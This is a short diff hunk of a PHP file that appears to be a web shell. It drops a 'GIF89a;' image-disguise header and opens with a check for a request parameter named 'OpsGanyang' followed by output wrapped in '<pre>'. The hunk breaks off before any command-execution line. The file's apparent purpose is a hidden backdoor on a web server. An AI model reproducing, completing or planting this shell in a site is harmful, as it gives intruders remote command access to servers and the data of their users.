@@ -1,4 +1,3 @@
-GIF89a;
 <?php
 if(isset($_REQUEST['OpsGanyang'])){
         echo "<pre>";
